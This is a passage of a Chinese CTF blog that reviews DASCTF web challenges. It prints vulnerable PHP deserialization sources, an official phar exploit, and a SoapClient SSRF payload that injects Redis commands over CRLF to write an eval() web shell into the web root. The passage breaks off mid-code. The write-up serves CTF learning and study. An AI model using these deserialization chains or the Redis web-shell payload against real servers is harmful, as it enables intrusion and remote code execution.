class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">hint</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="hade-waibo"><a href="#hade-waibo" class="headerlink" title="hade_waibo"></a>hade_waibo</h1><p>进来一看，<code>cancan need</code>任意文件读取，把文件全扒下来，核心实在<code>class.php</code>里面，肯定是<code>phar反序列化</code>。<br>乍一看，又要绕wakeup，不过这一次有引用赋值，可以绕，当时没时间了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;isLogin&#x27;</span>] = True;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$cklen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$cklen</span> != <span class="number">0</span> <span class="keyword">and</span> <span class="variable">$cklen</span> &lt;= <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">#更新黑名单为白名单，更加的安全</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$white</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\&#x27;file.php?m=show&amp;filename=\&#x27;+document.getElementById(\&#x27;filename\&#x27;).value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$filename</span>))&#123;<span class="keyword">die</span>();&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>)).<span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$type</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;dasctf&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.<span class="subst">$type</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload success! Path: upload/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rmfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf /var/www/html/upload/*&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$type</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>,<span class="variable">$this</span>-&gt;white))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新了一个恶意又有趣的Test类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;./upload&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="string">&quot;Don&#x27;t make dream.Wake up plz!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>],<span class="number">0</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;Hack by <span class="subst">$file</span> !&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Unreachable! :)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9?$@]+/&#x27;</span>, <span class="variable">$this</span>-&gt;value))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="string">&#x27;nono~&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>官方exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$User</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$Test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$User</span>-&gt;a = <span class="variable">$Test</span>;</span><br><span class="line"><span class="variable">$User</span>-&gt;username = &amp;<span class="variable">$Test</span>-&gt;value;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$User</span>);<span class="comment">#第二步，需要把name改成* /*</span></span><br><span class="line"><span class="comment">// $Test-&gt;a = $User;</span></span><br><span class="line"><span class="comment">// $User-&gt;username = $Test;</span></span><br><span class="line"><span class="comment">// echo serialize($Test);#第一步，需要把名字改成数组</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">\Phar</span>(<span class="string">&quot;h3ne1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;h3en1&#x27;</span>);</span><br><span class="line"><span class="comment">//$phar-&gt;setMetadata($Test);第一步</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$User</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>因为给实验室的新生配web靶机的docker环境，当时就顺手看看有没有<code>start.sh</code>或者<code>flag.sh</code>文件，然后就还真找到了<br><img src="/images/das10/1.png"><br><img src="/images/das10/2.png"></p>
<p>事实证明，docker运行之后，要删除的不只有环境变量，还有运行的sh脚本，谨防露牛子</p>
<blockquote>
<p>start.sh</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /ghjsdk_F149_H3re_asdasfc</span><br><span class="line"><span class="built_in">export</span> FLAG=no_flag</span><br><span class="line">FLAG=no_flag</span><br><span class="line">apache2-foreground</span><br><span class="line"><span class="built_in">rm</span> -rf /flag.sh</span><br><span class="line"><span class="built_in">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure>

<p>直接露牛子了吧<br><img src="/images/das10/3.png"></p>
<h1 id="EasyLove"><a href="#EasyLove" class="headerlink" title="EasyLove"></a>EasyLove</h1><p>当时急着复习，这题我没看了….寄</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$wllm</span>,<span class="variable">$arsenetang</span>,<span class="variable">$l61q4cheng</span>,<span class="variable">$love</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wllm = <span class="variable">$wllm</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arsenetang = <span class="variable">$arsenetang</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l61q4cheng = <span class="variable">$l61q4cheng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="variable">$love</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt; hint.<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hello</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$world</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hello</span>);   </span><br></pre></td></tr></table></figure>
<p>这回链子很短，先看<code>hint</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$hint</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>获得账号密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;My favorite database is Redis and My favorite day is 20220311&quot;</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>很明显，利用<code>SoapClient</code>进行<code>ssrf</code>然后打<code>redis</code>  <del>寄，还是不会</del><br>这里也看一下怎么打redis</p>
<blockquote>
<p>这里比较有趣的是，当我们利用ssrf向redis发起http请求时，低版本的Redis会将请求头的内容作为redis命令解析，那么只要我们通过CRLF控制住请求头，再配合SoapClient发起请求即可，故exp如下：</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc0</span>=<span class="string">&quot;AUTH 20220311&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$poc1</span>=<span class="string">&quot;SET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$poc2</span>=<span class="string">&quot;CONFIG SET dbfilename cmd.php&quot;</span>;</span><br><span class="line"><span class="variable">$poc3</span>=<span class="string">&quot;SAVE&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span> =&gt;</span><br><span class="line"><span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$poc0</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc1</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc2</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc3</span>.<span class="string">&#x27;^^hello&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$wllm</span> = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$arsenetang</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;l61q4cheng=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><del>确实要学学Redis咋用了，这都看不懂</del></p>
<h1 id="BlogSystem"><a href="#BlogSystem" class="headerlink" title="BlogSystem"></a>BlogSystem</h1><p>这是个好题，我慢慢品一品再来做,<del>太多涉及到我知识盲区的东西了</del></p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted index-categories" href="/categories/%E5%A4%8D%E7%8E%B0/">复现</a></div>  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-18  <a class="commentCountImg" href="/2022/10/18/Round6/#comment-container"><span class="display-none-class">d13142931df0df96b7beb8dc856eba9a</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d13142931df0df96b7beb8dc856eba9a">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/18/Round6/">Round 6复现</a></h1><div class="content"><h1 id="Web-check-V1"><a href="#Web-check-V1" class="headerlink" title="Web check(V1)"></a>Web check(V1)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span 